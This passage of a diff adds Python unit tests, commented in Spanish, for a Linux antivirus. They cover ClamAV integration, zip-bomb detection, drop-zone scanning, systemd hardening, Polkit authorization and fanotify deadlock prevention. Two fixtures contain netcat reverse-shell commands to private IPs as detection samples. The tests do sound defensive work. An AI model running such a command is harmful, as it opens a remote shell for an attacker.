+        th = threading.Thread(target=mock_clamd_server, daemon=True)
+        th.start()
+        time.sleep(0.1)
+
+        client_online = ClamAVDaemonClient(socket_path=mock_sock_path)
+        self.assertTrue(client_online.ping())
+        self.assertTrue(client_online.is_available())
+        ver = client_online.get_version()
+        self.assertIn("ClamAV 1.0.5", ver)
+
+        # Escaneo de muestra maliciosa
+        is_inf, threat = client_online.scan_file("/tmp/eicar.com")
+        self.assertTrue(is_inf)
+        self.assertEqual(threat, "Win.Test.EICAR_HDB-1")
+
+        # Escaneo de muestra limpia
+        is_inf_clean, _ = client_online.scan_file("/tmp/clean.bin")
+        self.assertFalse(is_inf_clean)
+
+        server_sock.close()
+
+    def test_archive_sentinel_recursive_inspection_and_zipbomb_protection(self):
+        """Verifica el centinela de archivos comprimidos, mitigación de Zip Bombs y detección de amenazas anidadas."""
+        from core.engine.archive_sentinel import ArchiveSentinel
+        import zipfile
+
+        sentinel = ArchiveSentinel(max_compression_ratio=50.0, max_files=10)
+
+        # 1. Detección de amenaza dentro de un contenedor ZIP legítimo
+        zip_path = os.path.join(self.tmp, "nested_malware.zip")
+        with zipfile.ZipFile(zip_path, "w") as zf:
+            zf.writestr("benign.txt", "Hola mundo")
+            # Simular script malicioso que coincide con regla YARA de netcat reverse shell
+            zf.writestr("payload.sh", "#!/bin/bash\nnc -e /bin/sh 10.0.0.1 4444\n")
+
+        res = self.scanner.scan_file(file_path=zip_path)
+        self.assertTrue(res.is_malicious, "El escáner debió detectar la amenaza dentro del ZIP")
+        self.assertIn("Archive.", res.threat_name)
+
+        # 2. Detección de Zip Bomb por ratio desproporcionado de descompresión
+        bomb_zip = os.path.join(self.tmp, "zip_bomb.zip")
+        with zipfile.ZipFile(bomb_zip, "w", compression=zipfile.ZIP_DEFLATED) as zf:
+            # 12 MB de ceros que se comprimen en menos de 15 KB (ratio > 800:1)
+            zeros = b"0" * (12 * 1024 * 1024)
+            zf.writestr("huge_empty_file.bin", zeros)
+
+        bomb_res = sentinel.inspect_and_scan(bomb_zip, scanner_func=lambda p: (False, None))
+        self.assertTrue(bomb_res.is_malicious, "El centinela debió neutralizar la Zip Bomb")
+        self.assertEqual(bomb_res.threat_name, "Archive.ZipBomb.DenialOfService")
+
+        # 3. Detección de Zip Bomb por exceso de archivos internos (> max_files)
+        many_files_zip = os.path.join(self.tmp, "many_files.zip")
+        with zipfile.ZipFile(many_files_zip, "w") as zf:
+            for i in range(15):
+                zf.writestr(f"file_{i}.txt", f"Contenido {i}")
+
+        many_res = sentinel.inspect_and_scan(many_files_zip, scanner_func=lambda p: (False, None))
+        self.assertTrue(many_res.is_malicious)
+        self.assertEqual(many_res.threat_name, "Archive.ExcessiveFileCount.DenialOfService")
+
+
+    def test_proactive_continuous_scanner_and_landing_zones(self):
+        """Verifica que el escáner activo continuo audite drop zones y neutralice malware proactivamente."""
+        from core.engine.proactive_scanner import ProactiveContinuousScanner
+        from core.engine.audit_logger import AuditLogger
+        from core.engine.vault import QuarantineVault
+
+        mock_drop = os.path.join(self.tmp, "proactive_drop_zone")
+        os.makedirs(mock_drop, exist_ok=True)
+
+        # Archivo limpio
+        benign_path = os.path.join(mock_drop, "notes.txt")
+        with open(benign_path, "w") as f:
+            f.write("Lista de compras y tareas normales.\n")
+
+        # Archivo malicioso (coincide con regla YARA de reverse shell netcat)
+        malware_path = os.path.join(mock_drop, "evil_backdoor.sh")
+        with open(malware_path, "w") as f:
+            f.write("#!/bin/bash\nnc -e /bin/sh 192.168.1.50 9999\n")
+
+        audit_log = AuditLogger(log_path=os.path.join(self.tmp, "audit_proactive.json"))
+        vault = self.vault
+        notifier = MagicMock()
+
+        proactive = ProactiveContinuousScanner(
+            scanner=self.scanner,
+            vault=vault,
+            notifier=notifier,
+            audit_logger=audit_log,
+            interval_seconds=1.0,
+            target_dirs=[mock_drop]
+        )
+
+        proactive.start()
+        self.assertTrue(proactive.running)
+
+        # Forzar un barrido proactivo inmediato
+        proactive.trigger_immediate_sweep()
+        time.sleep(0.5)
+
+        # Verificar que el malware fue aislado del drop zone
+        self.assertFalse(os.path.exists(malware_path), "El archivo malicioso debió ser neutralizado y movido al baúl")
+        self.assertTrue(os.path.exists(benign_path), "El archivo limpio debe permanecer intacto")
+
+        # Verificar telemetría en tiempo real
+        telem = proactive.get_telemetry()
+        self.assertEqual(telem["status"], "PROTECTION_ACTIVE_MONITORING")
+        self.assertTrue(telem["is_active"])
+        self.assertGreaterEqual(telem["files_scanned_count"], 1)
+        self.assertGreaterEqual(telem["threats_neutralized_count"], 1)
+
+        # Verificar registro en auditoría
+        incidents = audit_log.get_incidents()
+        self.assertGreaterEqual(len(incidents), 1)
+        self.assertIn("evil_backdoor.sh", incidents[0]["target"])
+
+        proactive.stop()
+        self.assertFalse(proactive.running)
+
+
+    def test_clamav_manager_comprehensive_integration(self):
+        """Verifica el gestor integral ClamAV: estado de clamd, firmas actualizables, archivos comprimidos y coordinación on-access."""
+        from core.engine.clamav_manager import ClamAVManager
+        import socket, threading, zipfile
+
+        # 1. Servidor mock de clamd para validar respuestas de scanning y keepalive
+        mock_sock_path = os.path.join(self.tmp, "clamd_mgr_test.sock")
+        server_sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+        server_sock.bind(mock_sock_path)
+        server_sock.listen(5)
+
+        def mock_server():
+            while True:
+                try:
+                    conn, _ = server_sock.accept()
+                    data = conn.recv(1024).decode("utf-8", errors="ignore")
+                    if "PING" in data:
+                        conn.sendall(b"PONG\n")
+                    elif "VERSION" in data:
+                        conn.sendall(b"ClamAV 1.0.5/27020/2026\n")
+                    elif "SCAN" in data:
+                        if "threat" in data:
+                            conn.sendall(b"/path/threat.bin: Win.Trojan.Agent-999 FOUND\n")
+                        else:
+                            conn.sendall(b"/path/clean.bin: OK\n")
+                    conn.close()
+                except Exception:
+                    break
+
+        th = threading.Thread(target=mock_server, daemon=True)
+        th.start()
+        time.sleep(0.1)
+
+        mgr = ClamAVManager(
+            socket_path=mock_sock_path,
+            threat_intel=self.scanner.intel,
+            vault=self.vault,
+            auto_start_daemon=False
+        )
+
+        self.assertTrue(mgr.is_engine_available())
+        ver = mgr.get_engine_version()
+        self.assertIn("ClamAV 1.0.5", ver)
+
+        status_info = mgr.get_status_info()
+        self.assertTrue(status_info["clamd_available"])
+        self.assertTrue(status_info["archive_protection_active"])
+
+        # 2. Análisis de malware conocido
+        threat_file = os.path.join(self.tmp, "threat_sample.bin")
+        with open(threat_file, "w") as f:
+            f.write("dummy threat")
+        is_inf, name, details = mgr.scan_file(threat_file)
+        self.assertTrue(is_inf)
+        self.assertEqual(name, "ClamAV.Win.Trojan.Agent-999")
+
+        # 3. Análisis de archivo comprimido infectado
+        zip_path = os.path.join(self.tmp, "container_with_threat.zip")
+        with zipfile.ZipFile(zip_path, "w") as zf:
+            zf.writestr("clean_doc.txt", "texto limpio")
+            zf.writestr("threat.bin", "contenido hostil detectado por mock clamd")
+
+        is_zip_inf, zip_threat, zip_details = mgr.scan_file(zip_path)
+        self.assertTrue(is_zip_inf)
+        self.assertIn("Win.Trojan.Agent-999", zip_threat)
+
+        # 4. Coordinación On-Access con fanotify y prevención de loops
+        mock_interceptor = MagicMock()
+        mock_interceptor.whitelist = MagicMock()
+        coord_res = mgr.coordinate_on_access_protection(mock_interceptor)
+        self.assertEqual(coord_res["on_access_mode"], "FANOTIFY_SYNCHRONOUS_COOPERATIVE")
+
+        # 5. Ejecución de actualización de firmas (tolerante a ausencia de red o freshclam)
+        update_res = mgr.update_signatures(timeout=2)
+        self.assertIn("message", update_res)
+
+        server_sock.close()
+
+
+    def test_systemd_security_auditor_compliance(self):
+        """Verifica la evaluación del SystemdSecurityAuditor y el cumplimiento de las recomendaciones oficiales."""
+        from core.engine.systemd_hardening import SystemdSecurityAuditor
+        service_file = os.path.join(ROOT_DIR, "service", "constantine.service")
+        auditor = SystemdSecurityAuditor(unit_path=service_file)
+        posture = auditor.evaluate_security_posture()
+        self.assertTrue(posture["unit_found"])
+        self.assertGreaterEqual(posture["score"], 90)
+        self.assertEqual(posture["rating"], "HARDENED_EXCELLENT")
+        self.assertIn("NoNewPrivileges", posture["passed_checks"])
+        self.assertIn("ProtectSystem", posture["passed_checks"])
+        self.assertIn("ProtectHome", posture["passed_checks"])
+        self.assertIn("PrivateTmp", posture["passed_checks"])
+        self.assertIn("CapabilityBoundingSet", posture["passed_checks"])
+        self.assertIn("DevicePolicy", posture["passed_checks"])
+        self.assertIn("SystemCallFilter", posture["passed_checks"])
+        self.assertIn("SystemCallArchitectures", posture["passed_checks"])
+
+
+    def test_polkit_authorization_integration_and_elevation(self):
+        """Verifica la delegación de autorización en Polkit y la ejecución segura de constantine-helper."""
+        from core.auth.auth_manager import AuthManager
+        import subprocess
+
+        auth = AuthManager()
+        self.assertTrue(auth.is_polkit_available(), "pkcheck debe estar disponible en el sistema")
+
+        # Mock de subprocess.run para validar autorización exitosa sin diálogo de escritorio en entorno headless
+        with unittest.mock.patch("subprocess.run") as mock_run:
+            mock_run.return_value = unittest.mock.MagicMock(returncode=0, stdout=b"", stderr=b"")
+            ok, tok = auth.request_polkit_authorization("org.constantine.antivirus.admin.unlock")
+            self.assertTrue(ok)
+            self.assertIsNotNone(tok)
+            self.assertTrue(auth.is_session_valid(tok))
+
+            mock_run.assert_called_once()
+            called_cmd = mock_run.call_args[0][0]
+            self.assertEqual(called_cmd[0], "pkcheck")
+            self.assertIn("--action-id=org.constantine.antivirus.admin.unlock", called_cmd)
+            self.assertIn("--allow-user-interaction", called_cmd)
+
+        # Mock de fallo/cancelación por parte del usuario
+        with unittest.mock.patch("subprocess.run") as mock_run_fail:
+            mock_run_fail.return_value = unittest.mock.MagicMock(returncode=1, stdout=b"", stderr=b"Not authorized")
+            ok_fail, tok_fail = auth.request_polkit_authorization("org.constantine.antivirus.admin.unlock")
+            self.assertFalse(ok_fail)
+            self.assertIsNone(tok_fail)
+
+        # Validación de argumentos estrictos de constantine-helper
+        helper_path = os.path.join(ROOT_DIR, "service", "constantine-helper")
+        res_help = subprocess.run([sys.executable, helper_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        self.assertNotEqual(res_help.returncode, 0, "Invocar sin argumentos debe fallar")
+        self.assertIn(b"Comando requerido", res_help.stderr)
+
+        res_invalid_action = subprocess.run([sys.executable, helper_path, "evil-action"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        self.assertNotEqual(res_invalid_action.returncode, 0)
+        self.assertIn(b"no reconocida", res_invalid_action.stderr)
+
+    def test_fanotify_anti_deadlock_and_infrastructure_bypass(self):
+        """
+        Verifica la prevención crítica de bloqueos mutuos (Deadlock Prevention):
+        1. Comprueba que PIDs ignorados (PID propio, init PID 1, kernel PID 2) reciban FAN_ALLOW inmediato.
+        2. Comprueba que rutas de infraestructura propia (/opt/constantine) y ClamAV (/var/lib/clamav) reciban FAN_ALLOW.
+        3. Comprueba que procesos reconocidos (clamd, freshclam) sean añadidos a ignored_pids y reciban FAN_ALLOW.
+        4. Comprueba que add_ignored_pid y add_ignored_comm funcionen correctamente.
+        """
+        mock_scanner = MagicMock()
+        interceptor = FanotifyInterceptor(scanner=mock_scanner, vault=self.vault)
+
+        # 1. Registro de PIDs y Comms
+        interceptor.add_ignored_pid(99991)
+        self.assertIn(99991, interceptor.ignored_pids)
+        interceptor.add_ignored_comm("clamd")
+        self.assertIn("clamd", interceptor.ignored_comm_names)
+
+        # 2. Evaluación de PID en ignored_pids
+        from core.engine.interceptor import AuthorizationContext, FAN_ALLOW, FAN_DENY, FAN_OPEN_PERM
+        ctx_ignored_pid = AuthorizationContext(fan_fd=-1, event_fd=-1, pid=99991, mask=FAN_OPEN_PERM, fallback_decision=FAN_DENY)
+        interceptor._evaluate_event(ctx_ignored_pid)
+        self.assertTrue(ctx_ignored_pid.responded)
+        self.assertEqual(ctx_ignored_pid.decision, FAN_ALLOW)
+        self.assertEqual(ctx_ignored_pid.reason, "SELF_OR_SYSTEM_PID")
+
+        # 3. Evaluación de PID init (1) y kernel (2)
+        ctx_init = AuthorizationContext(fan_fd=-1, event_fd=-1, pid=1, mask=FAN_OPEN_PERM, fallback_decision=FAN_DENY)
+        interceptor._evaluate_event(ctx_init)
+        self.assertEqual(ctx_init.decision, FAN_ALLOW)
+        self.assertEqual(ctx_init.reason, "SELF_OR_SYSTEM_PID")
+
+        # 4. Evaluación de ruta de infraestructura Constantine
+        ctx_infra = AuthorizationContext(fan_fd=-1, event_fd=-1, pid=8888, mask=FAN_OPEN_PERM, fallback_decision=FAN_DENY)
+        with unittest.mock.patch("os.readlink", return_value="/opt/constantine/daemon.py"):
+            interceptor._evaluate_event(ctx_infra)
+            self.assertEqual(ctx_infra.decision, FAN_ALLOW)
+            self.assertEqual(ctx_infra.reason, "SELF_INFRASTRUCTURE")
+
+        # 5. Evaluación de ruta de base de datos ClamAV
+        ctx_clamav = AuthorizationContext(fan_fd=-1, event_fd=-1, pid=8888, mask=FAN_OPEN_PERM, fallback_decision=FAN_DENY)
+        with unittest.mock.patch("os.readlink", return_value="/var/lib/clamav/daily.cld"):
+            interceptor._evaluate_event(ctx_clamav)
+            self.assertEqual(ctx_clamav.decision, FAN_ALLOW)
+            self.assertEqual(ctx_clamav.reason, "CLAMAV_INFRASTRUCTURE")
+
+        # 6. Evaluación de proceso con comm ignorado (ej. clamd)
+        ctx_comm = AuthorizationContext(fan_fd=-1, event_fd=-1, pid=77112, mask=FAN_OPEN_PERM, fallback_decision=FAN_DENY)
+        with unittest.mock.patch("os.readlink", return_value="/home/user/document.txt"),              unittest.mock.patch.object(interceptor, "get_process_name", return_value="clamd"):
+            interceptor._evaluate_event(ctx_comm)
+            self.assertEqual(ctx_comm.decision, FAN_ALLOW)
+            self.assertEqual(ctx_comm.reason, "IGNORED_COMM")
+            self.assertIn(77112, interceptor.ignored_pids)
 
 
 if __name__ == "__main__":
